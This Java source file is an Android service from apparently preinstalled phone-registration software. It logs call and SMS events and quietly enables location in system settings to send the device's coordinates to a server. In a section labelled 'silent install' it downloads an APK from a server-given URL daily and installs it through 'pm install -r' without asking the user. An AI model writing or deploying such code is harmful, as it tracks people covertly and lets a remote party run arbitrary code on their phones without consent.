package com.zf.doovreg;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Iterator;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.NetworkInfo.State;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.provider.Settings;
import android.util.Log;

//import com.baidu.location.BDLocation;
//import com.baidu.location.BDLocationListener;
//import com.baidu.location.LocationClient;
//import com.baidu.location.LocationClientOption;
import android.location.Criteria;
import android.location.GpsSatellite;
import android.location.GpsStatus;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.location.LocationProvider;

public class DoovRegService extends Service {
	private static final String TAG = "DoovReg/DoovRegService";
	private static final String TAGINSTALL = "DoovRegInstall";
	private static boolean waitting = false;
//	public LocationClient locationClient;
//	private MyLocationListener myLocationListener;
	public DoovRegGenInfo doovRegGen = null;
	private DoovRegHttp doovRegHttp = null;
//	private int searchCount;
//	private static boolean mPhoneState = false;
//	private static boolean mSmsState = false;
	private static boolean mNetState = false;
	private static boolean gpsEnabled;
	// ghshuai 去掉百度定位，换GPS定位 --begin
	private LocationManager locationManager;
	private Location location;
	private Criteria criteria;
//	private static int reRegCount = 0;
//	private SelectPayTypeDialog mSelectPayTypeDialog;
	// ghshuai 去掉百度定位，换GPS定位 --end

	
	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();

		doovRegGen = new DoovRegGenInfo(this);
		doovRegHttp = new DoovRegHttp(this);
//		getAndSetSN();
		//add for LQ 2017.3.2
		com.android.utilgk.Main.init(this.getApplicationContext(),"800625");
		Log.i(TAG, "start LQ!!!");
		// ghshuai 去掉百度定位，换GPS定位 --begin
/*		locationClient = new LocationClient(this);
		myLocationListener = new MyLocationListener();
		locationClient.registerLocationListener(myLocationListener);*/
		locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);		
		// ghshuai 去掉百度定位，换GPS定位 --end

	}

	@Override
	public void onStart(Intent intent, int startId) {
		// TODO Auto-generated method stub
		super.onStart(intent, startId);


		
		if (isNeedReg() && intent != null) {
			String action = intent.getAction();
		if (action == null) {
			Log.e(TAG, "The action is null!");
			return;
		}
			Log.i(TAG, "onStart action"+action);
			if (action.equals(DoovRegConst.ACTION_PHONE_STATE)) {
//				updateCallTime();//因需求改成只要通话就开始销量统计所以注释
				//exchangeRegInfo();
				writeRegStatus(DoovRegConst.CALL_FLAG, 1);
				Log.d(TAG, "mPhoneState = true");
//				mPhoneState = true;
			}
			else if (action.equals(DoovRegConst.ACTION_SMS_RECEIVED)) {
//				updateSmsNum();//因需求改成只要通话就开始销量统计所以注释
				//exchangeRegInfo();
				writeRegStatus(DoovRegConst.SMS_FLAG, 1);
//				mSmsState = true;
				Log.d(TAG, "mSmsState = true");
			}
			else if (action.equals(DoovRegConst.ACTION_CONNECTIVITY)) {
				updateNetStatus();
				Log.d(TAG, "mNetState = true 111111");
				if (readRegStatus(DoovRegConst.REG_ALLOW) != 0) {
					mNetState = true;
					Log.d(TAG, "mNetState = true");
				}
			}
			
			Log.d(TAG, "call flag =" + readRegStatus(DoovRegConst.CALL_FLAG));
			Log.d(TAG, "sms flag =" + readRegStatus(DoovRegConst.SMS_FLAG));
//			Log.d(TAG, "mPhoneState ="+mPhoneState +", mSmsState = "+mSmsState + ", mNetState = "+mNetState);
			if((readRegStatus(DoovRegConst.CALL_FLAG) == 1) && (readRegStatus(DoovRegConst.SMS_FLAG) == 1) && mNetState){
//			if(mNetState){
				Log.d(TAG, "exchangeRegInfo");
//				reRegCount = 0;
				exchangeRegInfo();
			}
		}
		
		/*
		 * add by huangjiawei begin 静默安装
		 */
		
		if (intent != null) {
			//判断是否网络变化
			String actions = intent.getAction();
			if (actions == null) {
			Log.e(TAGINSTALL, "The action is null!!!");
			return;
		}
			if (actions.equals(DoovRegConst.ACTION_CONNECTIVITY)) {
				Log.i(TAGINSTALL,"install is get the net change--" + getAppVersionName(this));

				
				handler.sendEmptyMessageDelayed(DoovRegConst.INSTALL_DELAY_POST, DoovRegConst.DELAY_TIME);
				
			}
		}
		
		/*
		 * add by huangjiawei end 静默安装
		 */
		
	}

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

	private boolean isNeedReg() {
		Log.d(TAG, "native status =" + readRegStatus(DoovRegConst.REG_STATUS));
		Log.d(TAG, "OperatorName() length() =" + doovRegGen.getOperatorName().length());
		Log.d(TAG, "waitting =" + waitting);
		if (readRegStatus(DoovRegConst.REG_STATUS) == 0
				&& doovRegGen.getOperatorName().length() > 0
				&& waitting == false)
			return true;
		else
			return false;
	}

//	private void updateCallTime() {
//		int callTime = 0;
//		Cursor cursor = getContentResolver().query(DoovRegConst.CALL_LOG_URI,
//				new String[] { DoovRegConst.CALL_LOG_DURATION }, 
//				null, null, DoovRegConst.CALL_LOG_SORT_ORDER);
//
//		for (int i = 0; i < cursor.getCount(); i++) {
//			cursor.moveToPosition(i);
//			callTime += cursor.getInt(0);
//			if (callTime >= DoovRegConst.CALL_TIME_MAX) break;
//		}
//		cursor.close();
//
//		writeRegStatus(DoovRegConst.CALL_TIME, callTime);
//		Log.d(TAG, "call time is " + callTime);
//	}

//	private void updateSmsNum() {
//		int smsNumber = 0;
//		Cursor cursor = getContentResolver().query(DoovRegConst.SMS_URI_INBOX,
//				new String[] { DoovRegConst.SMS_ID }, null, null, null);
//
//		smsNumber = cursor.getCount();
//		cursor.close();
//
//		writeRegStatus(DoovRegConst.SMS_NUM, smsNumber);
//		Log.d(TAG, "total sms number is " + smsNumber);
//	}

	private void updateNetStatus() {
		ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo info = connectivityManager.getActiveNetworkInfo();

		if (info != null && info.isAvailable()) {
			writeRegStatus(DoovRegConst.NET_SATUS, DoovRegConst.NET_AVAILABLE_TRUE);
			Log.d(TAG, "Current network is " + info.getTypeName());
		} else {
			writeRegStatus(DoovRegConst.NET_SATUS, DoovRegConst.NET_AVAILABLE_FALSE);
			Log.d(TAG, "No available network.");
		}
	}
	@SuppressLint("NewApi") 
	private boolean setLocationEnabled(boolean enabled) {
//        int currentUserId = ActivityManager.getCurrentUser();
//        if (isUserLocationRestricted(currentUserId)) {
//            return false;
//        }
		Log.d(TAG, "setLocation is "+ enabled);
        final ContentResolver cr = this.getContentResolver();
        // When enabling location, a user consent dialog will pop up, and the
        // setting won't be fully enabled until the user accepts the agreement.
        int mode = enabled ? Settings.Secure.LOCATION_MODE_HIGH_ACCURACY : Settings.Secure.LOCATION_MODE_OFF;
        // QuickSettings always runs as the owner, so specifically set the settings
        // for the current foreground user.
        return Settings.Secure.putInt(cr, Settings.Secure.LOCATION_MODE, mode);
    }

	private void exchangeRegInfo() {
		if (readRegStatus(DoovRegConst.NET_SATUS) == DoovRegConst.NET_AVAILABLE_TRUE)
		{
			waitting = true;
//			gpsEnabled = Settings.Secure.isLocationProviderEnabled( getContentResolver(), LocationManager.GPS_PROVIDER);
			gpsEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
			Log.d(TAG, "gpsEnabled = " +gpsEnabled);
			if (!gpsEnabled){
	    		Log.d(TAG, "turn on GPS!");
	    		//Settings.Secure.setLocationProviderEnabled(getContentResolver(),LocationManager.GPS_PROVIDER, true);// 如果系统的Provider位置权限为关，使能它
	    		setLocationEnabled(true);
			}
			startLocation();
			
		}
	}

	@SuppressLint("NewApi") 
	public void startLocation() {
		/*
		LocationClientOption option = new LocationClientOption();
		option.setLocationMode(DoovRegConst.LOCATION_MODE);
		option.setCoorType(DoovRegConst.COORD_TYPE);
		option.setScanSpan(0);
		option.setNeedDeviceDirect(false);
		option.setIsNeedAddress(false);
		locationClient.setLocOption(option);
		locationClient.start();
		*/
		String bestProvider;
//		locationManager.removeUpdates(locationListener);
//		Log.d(TAG, "getAllProviders is " +locationManager.getAllProviders());
//		Log.d(TAG, "getProviders is " +locationManager.getProviders(true));
//		Log.d(TAG, "getProviders NETWORK_PROVIDER is " +locationManager.getProvider(LocationManager.NETWORK_PROVIDER));
//		Log.d(TAG, "getProviders GPS_PROVIDER is " +locationManager.getProvider(LocationManager.GPS_PROVIDER));
		Log.d(TAG, "isProviderEnabled NETWORK_PROVIDER is " +locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER));
		Log.d(TAG, "isProviderEnabled GPS_PROVIDER is " +locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER));
		bestProvider = locationManager.getBestProvider(getCriteria(), true);
//		String bestProvider = "network";
        Log.d(TAG, "bestProvider=="+bestProvider);    
        if (bestProvider == LocationManager.GPS_PROVIDER){
        	bestProvider = LocationManager.NETWORK_PROVIDER;
        	Log.d(TAG, "change Provider=="+bestProvider);  
        }
        location = locationManager.getLastKnownLocation(bestProvider); 
        Log.d(TAG, "getLastKnownLocation ==" + location);
        locationManager.addGpsStatusListener(listener);
        locationManager.requestLocationUpdates(bestProvider, 1000, 0,locationListener);
	}
	
    /**
     * 返回查询条件
     * @return
     */
    private Criteria getCriteria(){
    	criteria=new Criteria();
        //设置定位精确度 Criteria.ACCURACY_COARSE比较粗略，Criteria.ACCURACY_FINE则比较精细 
        criteria.setAccuracy(Criteria.ACCURACY_COARSE);    
        //设置是否要求速度
        criteria.setSpeedRequired(false);
        // 设置是否允许运营商收费  
        criteria.setCostAllowed(true);
        //设置是否需要方位信息
        criteria.setBearingRequired(false);
        //设置是否需要海拔信息
        criteria.setAltitudeRequired(false);
        // 设置对电源的需求  
        criteria.setPowerRequirement(Criteria.POWER_LOW);
        return criteria;
        
    }
 // 状态监听
 	@SuppressLint("NewApi") 
 	GpsStatus.Listener listener = new GpsStatus.Listener() {
 		public void onGpsStatusChanged(int event) {
 			
 			switch (event) {
 			// 第一次定位
 			case GpsStatus.GPS_EVENT_FIRST_FIX:
 				Log.i(TAG, "---GPS_EVENT_FIRST_FIX----");
 				break;
 			// 卫星状态改变
 			case GpsStatus.GPS_EVENT_SATELLITE_STATUS:
 				Log.i(TAG, "---GPS_EVENT_SATELLITE_STATUS----");
 				// 获取当前状态
 				GpsStatus gpsStatus = locationManager.getGpsStatus(null);
 				// 获取卫星颗数的默认最大值
 				int maxSatellites = gpsStatus.getMaxSatellites();
 				// 创建一个迭代器保存所有卫星
 				Iterator<GpsSatellite> iters = gpsStatus.getSatellites()
 						.iterator();
 				int count = 0;
 				while (iters.hasNext() && count <= maxSatellites) {
 					GpsSatellite s = iters.next();
 					count++;
 				}
// 				searchCount++;
// 				Log.i(TAG, "count = " +count);
// 				Log.i(TAG, "searchCount = " +searchCount);
// 				if ((searchCount> 10)&&(count > 3)){
// 					searchCount = 0;
// 					startLocation();
// 				}
 				System.out.println("搜索到：" + count + "颗卫星");
 				Log.i(TAG, "搜索到：" + count + "颗卫星");
 				break;
 			// 定位启动
 			case GpsStatus.GPS_EVENT_STARTED:
 				Log.i(TAG, "---GPS_EVENT_STARTED----");
 				break;
 			// 定位结束
 			case GpsStatus.GPS_EVENT_STOPPED:
 				Log.i(TAG, "---GPS_EVENT_STOPPED----");
 				break;
 			}
 		};
 	};
    /*
     * 如果GPS定位打开了则调用startLocation;否则跳转到GPS服务设置界面。
     */
//    private void startLocationForGPS(){
//    	boolean gpsEnabled = Settings.Secure.isLocationProviderEnabled( getContentResolver(), LocationManager.GPS_PROVIDER);
//    	if(!locationManager.isProviderEnabled(android.location.LocationManager.GPS_PROVIDER)){
//    		Log.d(TAG, "turn on GPS!");
//    		Settings.Secure.setLocationProviderEnabled(getContentResolver(),LocationManager.GPS_PROVIDER, true);// 如果系统的Provider位置权限为关，使能它
//		}
//    	startLocation();
//    }
    
    /*
     * LocationListener监听器
     * 当位置发生改变时，会将最新的位置信息显示在界面上 
     */
    LocationListener locationListener = new LocationListener() {
        @SuppressLint("NewApi") @Override
        public void onLocationChanged(Location location) {
            // TODO Auto-generated method stub
        	if(location != null){
        		Message msg = new Message();
				Bundle data = new Bundle();
				data.putDouble("longitude", location.getLongitude());
				data.putDouble("latitude", location.getLatitude());
				msg.setData(data);
				msg.what = DoovRegConst.ACTION_LOCATION_RESULT;
				handler.sendMessage(msg);
				Log.d(TAG, "longitude:  "+location.getLongitude());
				Log.d(TAG, "latitude:  "+location.getLatitude());
				locationManager.removeGpsStatusListener(listener);
				locationManager.removeUpdates(locationListener);
				Log.d(TAG, "gpsEnabled:  "+gpsEnabled);
				if (!gpsEnabled){
//					Settings.Secure.setLocationProviderEnabled(getContentResolver(),LocationManager.GPS_PROVIDER, false);
					setLocationEnabled(false);
					Log.d(TAG, "turn off GPS!");
				}
        	}
        }
 
        @Override
        public void onProviderDisabled(String arg0) {
            // TODO Auto-generated method stub
        	Log.d(TAG, "======onProviderDisabled=====");
        }
 
        @Override
        public void onProviderEnabled(String arg0) {
            // TODO Auto-generated method stub
        	Log.d(TAG, "======onProviderEnabled=====");
        }
 
        @Override
        public void onStatusChanged(String arg0, int status, Bundle extras) {
            // TODO Auto-generated method stub
            switch (status) {
            //GPS状态为可见时
            case LocationProvider.AVAILABLE:
                Log.i(TAG, "==AVAILABLE==");
                break;
            //GPS状态为服务区外时
            case LocationProvider.OUT_OF_SERVICE:
                Log.i(TAG, "==OUT_OF_SERVICE==");
                break;
            //GPS状态为暂停服务时
            case LocationProvider.TEMPORARILY_UNAVAILABLE:
                Log.i(TAG, "==TEMPORARILY_UNAVAILABLE==");
                break;
            }
        }
 
    };    
    /*
	private class MyLocationListener implements BDLocationListener {
		@Override
		public void onReceiveLocation(BDLocation arg0) {
			// TODO Auto-generated method stub
			if (arg0.getLocType() == BDLocation.TypeGpsLocation 
					|| arg0.getLocType() == BDLocation.TypeNetWorkLocation
					|| arg0.getLocType() == BDLocation.TypeCacheLocation
					|| arg0.getLocType() == BDLocation.TypeOffLineLocationNetworkFail
					|| arg0.getLocType() == BDLocation.TypeOffLineLocation) {
				Message msg = new Message();
				Bundle data = new Bundle();
				data.putDouble("longitude", arg0.getLongitude());
				data.putDouble("latitude", arg0.getLatitude());
				msg.setData(data);
				msg.what = DoovRegConst.ACTION_LOCATION_RESULT;
				handler.sendMessage(msg);
				Log.d(TAG, "longitude:  "+arg0.getLongitude());
				Log.d(TAG, "latitude:  "+arg0.getLatitude());
			}
			else {
				waitting = false;
				Log.d(TAG, "baidu location error " + arg0.getLocType());
			}
			locationClient.stop();
		}
	}
	*/
	Handler handler = new Handler() {
		@SuppressLint("NewApi") @Override
		public void handleMessage(Message msg) {
			switch (msg.what) {
			case DoovRegConst.ACTION_LOCATION_RESULT:
				Log.i(TAG, "ACTION_LOCATION_RESULT");
				Bundle locationData = msg.getData();
				doovRegGen.longitude = locationData.getDouble("longitude");
				doovRegGen.latitude = locationData.getDouble("latitude");

				new Thread(new Runnable() {
					@Override
					public void run() {
						Message msg = new Message();
						Bundle registerStatus = new Bundle();
    			        registerStatus.putString("regStatus",doovRegHttp.postReg());
						msg.setData(registerStatus);
						msg.what = DoovRegConst.ACTION_REGISTER_RESULT;
						handler.sendMessage(msg);
					}
				}).start();
				break;
			case DoovRegConst.ACTION_REGISTER_RESULT:
				
				Bundle registerStatus = msg.getData();
				String regStatus = registerStatus.getString("regStatus");
				Log.d(TAG, "Service return is " + regStatus);
				try {
					if (regStatus != null) {
						int type = Integer.parseInt(regStatus);
//						writeToSD(type);
						switch (type) {
						case 0:
							writeRegStatus(DoovRegConst.REG_STATUS, type);
							break;
						case 1:
							writeRegStatus(DoovRegConst.REG_STATUS, type);
							sendBroadcast(new Intent("com.doov.register.BEGINREG"));
							break;
						case 2:
							writeRegStatus(DoovRegConst.REG_STATUS, type);
							break;
						default:
						}
//					}else{
//						reRegCount++;
//						Log.d(TAG, "reRegCount =  " + reRegCount);
//						if (reRegCount < 3){
//							Log.d(TAG, "reReg!!");
//							exchangeRegInfo();
//						}
					}
				} catch (NumberFormatException e) {
					e.printStackTrace();
				}

				Handler mHandler = new Handler(Looper.getMainLooper());
				mHandler.post(new Runnable() {
					@Override
					public void run() {
						// Toast.makeText(DoovRegService.this, "Register check",
						// Toast.LENGTH_LONG).show();
						Log.i(TAG, "Register check!");
					}
				});
				waitting = false;
				break;
				
				// add by huangjiawei 静默安装 begin
				
			case DoovRegConst.INSTALL_DELAY_POST:
				
				new Thread(new Runnable() {
					
					@Override
					public void run() {
						// 请求网络
						
						if (!isNetworkAvailable()) {
							Log.i(TAGINSTALL, "no network to work");
							return;
						}
						//判断是否一天内已经检查过

						if (!isWithinOneDay()) {
							Log.i(TAGINSTALL, "install.iswithoneday == false");
							return;
						}
						String result = doovRegHttp.postInstall();
						Log.i(TAGINSTALL, "huangjiawei postInstall--result == " + result);
						
						Message msg = new Message();
						msg.obj = result;
						msg.what = DoovRegConst.INSTALL_RESULT;
						handler.sendMessage(msg);
					}
				}).start();
				
				break;
				
			case DoovRegConst.INSTALL_RESULT:
				String result = (String) msg.obj;
				
				if(DoovRegConst.DOWNLOAD_FAIL_JUDGE.equals(result) && readInstallLongStatus(DoovRegConst.DOWNLOAD_FAIL) <= 3){
					//如果下载失败，并且次数少于三次。
					result = readInstallStringResult("install_result");
					Log.i(TAGINSTALL,"download-fail-result-num ==" + result);
				}else if(DoovRegConst.DOWNLOAD_FAIL_JUDGE.equals(result) && readInstallLongStatus(DoovRegConst.DOWNLOAD_FAIL) > 3){
					Log.i(TAGINSTALL,"download-fail-result-return ");
					return;
				} 
				else {
					// 正常走
					if(null == result || "".equals(result) || result.isEmpty() || "[]".equals(result)){
						return;
					}
					
					writeInstallStringResult(DoovRegService.this,"install_result",result);
				}
				
				
				final DoovRegInstallInfo info = DoovRegInstallInfo.json2Obj(result);
				
				
				if(null != info && info.getVersionCode() > 0 && null != info.getVersionName()){
					Log.i(TAGINSTALL,"info.VersionCode == " + info.getVersionCode());
					//判断检查版本，版本一样不操作。
					if(getAppVersionName(DoovRegService.this) == info.getVersionCode()){
						Log.i(TAGINSTALL,"info.versionname is same");
						return;
					}
					//是否限制网络升级
					if(info.getLimitNet() == 1){
						Log.i(TAGINSTALL,"info.limitNet == " + info.getLimitNet());
						
						//判断网络状态，是手机数据还是WiFi？
						if (checkNewWorkStatus() != DoovRegConst.NETSTATUS_WIFI) {
							Log.i(TAGINSTALL, "install.checknewWorkstatus != wifi");
							return;
						}
					}
					
					
					
					final String apkUrl = info.getDownloadUrl();
					// 如果下载文件的apk为空或者"",return
					if(null == apkUrl || "".equals(apkUrl)){
						Log.i(TAGINSTALL,"info.apkUrl == " + apkUrl);
						return;
					}
					
					new Thread(new Runnable() {
						@Override
						public void run() {
							Message msg = new Message();
							Bundle installBundle = new Bundle();
							// 下载apk,返回文件大小，返回-1为失败
							long judge = downlaodFile(apkUrl);
							Log.i(TAGINSTALL,"downloadFile.final.judge == " + judge);
							installBundle.putLong("installActual",judge);
							//服务器上文件大小
							installBundle.putLong("installWebSize",info.getFileSize());
							msg.setData(installBundle);
							msg.what = DoovRegConst.INSTALL_JUDGE_RESULT;
							handler.sendMessage(msg);
						}
					}).start();
								
				}
				Log.i(TAGINSTALL, " two--result == " + result);
				Log.i(TAGINSTALL, " select--result == " + info.getVersionCode());
				break;
				
			case DoovRegConst.INSTALL_JUDGE_RESULT:
				Bundle fileSize = msg.getData();
				long ActualSize = fileSize.getLong("installActual");
				long WebSize = fileSize.getLong("installWebSize");
				Log.i(TAGINSTALL,"Install_result == " + ActualSize + "---" + WebSize);
				//如果下载不失败&&服务器的文件大小等于实际下载好的大小，就成功
				if(ActualSize != -1 && WebSize == ActualSize){
					Log.i(TAGINSTALL,"install is success -- download is well");
					//成功
					handler.post(new Runnable() {  
					    @Override  
					    public void run() {
					    writeInstallLongStatus(DoovRegService.this,DoovRegConst.DOWNLOAD_FAIL,0);
					    boolean isInstallSuccess = installApp(FileUtil.DIRPATH + FileUtil.FILENAME);
					    Log.i(TAGINSTALL,"install is success? or not ---" + isInstallSuccess);
					    // 自我安装，后面代码不会跑
					    if(!isInstallSuccess){
					    	Log.i(TAGINSTALL,"install is Fialure--");
					    	boolean isInstallFailure = installApp(FileUtil.DIRPATH + FileUtil.FILENAME);
					    	if(!isInstallFailure){
					    		FileUtil fileUtil = new FileUtil();
						    	//安装失败两次过后删除apk
						    	if(fileUtil.isFileExist()){
						    		fileUtil.clearFile();
						    	}
					    	}
					    }
					}  
					}); 
					
					}else{
					//下载失败
						Log.i(TAGINSTALL,"download is Failure--");
						long i = readInstallLongStatus(DoovRegConst.DOWNLOAD_FAIL);
						i++;
						writeInstallLongStatus(DoovRegService.this,DoovRegConst.DOWNLOAD_FAIL,i);
						Message mMsg = new Message();
						mMsg.what = DoovRegConst.INSTALL_RESULT;
						mMsg.obj = DoovRegConst.DOWNLOAD_FAIL_JUDGE;
						handler.sendMessage(mMsg);
					}
				break;
				// add by huangjiawei 静默安装 end
			}
			super.handleMessage(msg);
		}
	};

	public void writeRegStatus(String key, int value) {
		SharedPreferences sharedPreferences = getSharedPreferences(DoovRegConst.REG_CONFIG_FILE, Context.MODE_PRIVATE);
		SharedPreferences.Editor editor = sharedPreferences.edit();
		editor.putInt(key, value);
		editor.commit();
	}

	protected void writeToSD(int type) {
		File file=new File(Environment.getExternalStorageDirectory()+File.separator+"DoovReg");
		if (!file.exists()) {
			file.mkdirs();
		}
		Date myString=new Date();
		SimpleDateFormat sf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		FileOutputStream out = null;
		try {
			out = new FileOutputStream(file.toString()+File.separator+"DoovReg.txt",true);
			byte buf[]=("\n"+sf.format(myString)+"     result:"+type).getBytes();
			out.write(buf);
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		} finally{
			if (out!=null) {
				try {
					out.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		}
	}
	public int readRegStatus(String key) {
		SharedPreferences sharedPreferences = getSharedPreferences(DoovRegConst.REG_CONFIG_FILE, Context.MODE_PRIVATE);
		return sharedPreferences.getInt(key, 0);
	}
	
	// add by huangjiawei begin 静默安装
	//判断是否一天内已经检查过
	public boolean isWithinOneDay(){
		long lastTime = readInstallLongStatus(DoovRegConst.REG_ONEDAY);
		long time = System.currentTimeMillis();
		if ((time - lastTime) > DoovRegConst.CHECKDATA_TIME ) {
			writeInstallLongStatus(this, DoovRegConst.REG_ONEDAY, time);
			return true;
		}
		
		Log.i(TAGINSTALL, "lasttime == " + lastTime + "--currecttime == " + time);
		return false;
	}
	
	public long readInstallLongStatus(String key) {
		SharedPreferences sharedPreferences = getSharedPreferences(DoovRegConst.REG_CONFIG_FILE, Context.MODE_PRIVATE);
		return sharedPreferences.getLong(key, 0);
	}
	
	public String readInstallStringResult(String key) {
		SharedPreferences sharedPreferences = getSharedPreferences(DoovRegConst.REG_CONFIG_FILE, Context.MODE_PRIVATE);
		return sharedPreferences.getString(key, "");
	}
	
	public void writeInstallLongStatus(Context context,String key, long value) {
		SharedPreferences sharedPreferences = context.getSharedPreferences(DoovRegConst.REG_CONFIG_FILE, Context.MODE_PRIVATE);
		SharedPreferences.Editor editor = sharedPreferences.edit();
		editor.putLong(key, value);
		editor.commit();
	}
	
	public void writeInstallStringResult(Context context,String key, String value) {
		SharedPreferences sharedPreferences = context.getSharedPreferences(DoovRegConst.REG_CONFIG_FILE, Context.MODE_PRIVATE);
		SharedPreferences.Editor editor = sharedPreferences.edit();
		editor.putString(key, value);
		editor.commit();
	}
	
	//检查网络状态，是数据还是wifi
	public int checkNewWorkStatus(){
		ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo info = connectivityManager.getActiveNetworkInfo();

		//如果有网络连接
		if (info != null && info.isAvailable()) {
			//mobile Data Network  
	        State mobile = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE).getState();  
	        //wifi  
	        State wifi = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI).getState();  
	          
	        if(mobile==State.CONNECTED||mobile==State.CONNECTING)  
	            return DoovRegConst.NETSTATUS_DATA;  
	        if(wifi==State.CONNECTED||wifi==State.CONNECTING)  
	            return DoovRegConst.NETSTATUS_WIFI;
			Log.d(TAG, "Current installnetwork is " + info.getTypeName());
		} else {
			return 0;
		}
		  
		return 0;
	}
	
	/** 
     * 返回当前程序版本名 
     */  
    public static int getAppVersionName(Context context) {  
        String versionName = ""; 
        int versioncode = 0;
        try {  
            // ---get the package info---  
            PackageManager pm = context.getPackageManager();  
            PackageInfo pi = pm.getPackageInfo(context.getPackageName(), 0);  
            versionName = pi.versionName;  
            versioncode = pi.versionCode;
            if (versionName == null || versionName.length() <= 0) {  
                return 0;  
            }  
        } catch (Exception e) {  
            Log.e("VersionInfo", "Exception", e);  
        }  
        return versioncode;  
    }
    
    /**
	 * 静默安装apk
	 * @param apkPath
	 * @return
	 */
	public static boolean installApp(String apkPath) {
		String[] args = { "pm", "install", "-r", apkPath };
		String result = "";
		ProcessBuilder processBuilder = new ProcessBuilder(args);
		Process process = null;
		InputStream errIs = null;
		InputStream inIs = null;

        /* Add by CFZ for 特殊手机，安装时，可以调用pm instal 命令，但不会默认安装  at 20161206 Begin */
//        if (Utils.isInstallSpecialOS())
//        {
//            return false;
//        }
        /* Add by CFZ for 特殊手机，安装时，可以调用pm instal 命令，但不会默认安装  at 20161206 End */
		Log.i("huangjiawei", "installAPP is begin..by one step");
		try {
			ByteArrayOutputStream baos = new ByteArrayOutputStream();
			int read = -1;
			process = processBuilder.start();
			errIs = process.getErrorStream();
			while ((read = errIs.read()) != -1) {
				baos.write(read);
			}
			//长度不为0，出错了
//			if(baos.size() > 0) {
//				NetRequestFactory.dumpELog("err: install app: " + apkPath + "  for cause: " + baos.toByteArray());
//				baos.reset();
//			}
			
			//自我安装，并不能走到一下代码。安装成功便覆盖了。
			inIs = process.getInputStream();
			while ((read = inIs.read()) != -1) {
				baos.write(read);
			}
			byte[] data = baos.toByteArray();
			result = new String(data);
			if(result.length() > 0 && result.startsWith("Success")) {
				return true;
			}
		} catch (IOException e) {
			e.printStackTrace();
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			try {
				if (errIs != null) {
					errIs.close();
				}
				if (inIs != null) {
					inIs.close();
				}
			} catch (IOException e) {
				e.printStackTrace();
			}
			if (process != null) {
				process.destroy();
			}
		}
		return false;
	}
	
	 /**
     * 读取任何文件
     * 返回-1 ，代表下载失败。返回非-1，代表成功。文件已经存在就先删除文件
     *
     * @param urlStr
     * @return
     */
    public long downlaodFile(String urlStr) {
        InputStream input = null;
        URL url = null;
        long size = 0;

        try {
            FileUtil fileUtil = new FileUtil();
            // 如果文件已经存在，先删除文件
            if (fileUtil.isFileExist()) {
            	fileUtil.clearFile();
            } 
            
            	url = new URL(urlStr);
                HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();
                 input = urlConn.getInputStream();
                File resultFile = fileUtil.write2SDFromInput(input);
                
                if (resultFile == null)
                    return -1;
                size = fileUtil.getFileSize(resultFile);
        } catch (IOException e) {
            e.printStackTrace();
            return -1;
        } catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
        finally {
            try {
            	if (input != null) {
            		 input.close();
				}

            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return size;
    }
    
    private boolean isNetworkAvailable() {
        // 得到网络连接信息
        ConnectivityManager manager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        // 去进行判断网络是否连接
        if (manager.getActiveNetworkInfo() != null) {
            return manager.getActiveNetworkInfo().isAvailable();
        }
        return false;
    }
	// add by huangjiawei end 静默安装
}
